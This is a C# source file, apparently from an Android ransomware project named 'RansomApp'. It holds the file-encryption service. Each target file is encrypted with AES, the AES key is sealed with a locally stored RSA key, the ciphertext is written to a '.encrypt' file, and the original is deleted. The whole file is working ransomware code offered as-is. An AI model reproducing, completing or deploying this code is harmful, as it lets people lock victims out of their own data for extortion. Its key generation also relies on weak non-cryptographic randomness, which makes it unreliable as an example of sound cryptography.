using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;

namespace RansomApp.Droid.Services.Encrypt
{
    public static class EncryptService
    {
        //public static readonly int resCod = 1000;
        static readonly CspParameters cryptoProvider = new CspParameters();
        static RSACryptoServiceProvider rsaCryptoProvider;


        public static void EncryptFile(string file)
        {
            RijndaelManaged rinjdManaged = new RijndaelManaged();
            rinjdManaged.KeySize = 256;
            rinjdManaged.BlockSize = 256;
            rinjdManaged.Mode = CipherMode.CBC;
            ICryptoTransform cryptoTransform = rinjdManaged.CreateEncryptor();

            byte[] keyEncrypted = rsaCryptoProvider.Encrypt(rinjdManaged.Key, false);

            byte[] lenK = NewBytes();
            byte[] lenIV = NewBytes();

            int lKey = keyEncrypted.Length;
            lenK = BitConverter.GetBytes(lKey);

            int lIV = rinjdManaged.IV.Length;
            lenIV = BitConverter.GetBytes(lIV);


            string outfile = file.Substring(0, file.LastIndexOf(".")) + ".encrypt";

            using (FileStream outFileStream = new FileStream(outfile, FileMode.Create))
            {
                outFileStream.Write(lenK, 0, 4);
                outFileStream.Write(lenIV, 0, 4);
                outFileStream.Write(keyEncrypted, 0, lKey);
                outFileStream.Write(rinjdManaged.IV, 0, lIV);


                using (CryptoStream outStreamEncrypted = new CryptoStream(outFileStream, cryptoTransform, CryptoStreamMode.Write))
                {
                    int count = 0;

                    int blockSizeBytes = rinjdManaged.BlockSize / 8;
                    byte[] data = new byte[blockSizeBytes];
                    int bytesRead = 0;


                    using (FileStream inFileStream = new FileStream(file, FileMode.Open))
                    {
                        do
                        {
                            count = inFileStream.Read(data, 0, blockSizeBytes);
                            outStreamEncrypted.Write(data, 0, count);
                            bytesRead += blockSizeBytes;

                        } while (count > 0);
                        inFileStream.Close();
                    }
                    outStreamEncrypted.FlushFinalBlock();
                    outStreamEncrypted.Close();
                }

                outFileStream.Close();
            }
            _DeleteFile(file);

            static byte[] NewBytes() => new byte[4];

        }

        public static string CreateKey()
        {
            string key = Key(20);
            string clv = GetMD5(key);
            cryptoProvider.KeyContainerName = clv;
            rsaCryptoProvider = new RSACryptoServiceProvider(cryptoProvider);
            rsaCryptoProvider.PersistKeyInCsp = true;
            return key;
        }

        private static string GetMD5(string str)
        {
            MD5CryptoServiceProvider md5 = new MD5CryptoServiceProvider();
            ASCIIEncoding encoding = new ASCIIEncoding();

            byte[] stream;
            StringBuilder stringBuilder = new StringBuilder();

            stream = md5.ComputeHash(encoding.GetBytes(str));

            for (int index = 0; index < stream.Length; index++)
            {

                stringBuilder.AppendFormat("{0:x2}", stream[index]);
            }

            return stringBuilder.ToString();

        }

        private static string Key(int longitud)
        {
            string upper = "ABCDEFGHIJKLMNÑOPQRSTUVWXYZ";
            string lower = "abcdefghijklmnñopqrstuvwxyz";
            string numbs = "1234567890";
            string specials = "=!¡¿?[{+}]°|.,_-";

            string characters = upper += lower += numbs += specials;

            StringBuilder stringBuilder = new StringBuilder();
            Random random = new Random();
            while (0 < longitud--)
            {
                stringBuilder.Append(characters[random.Next(characters.Length)]);
            }
            return stringBuilder.ToString();
        }

        private static void _DeleteFile(string pathFile)
        {
            if (File.Exists(pathFile))
            {
                File.Delete(pathFile);
            }
        }
    }
}
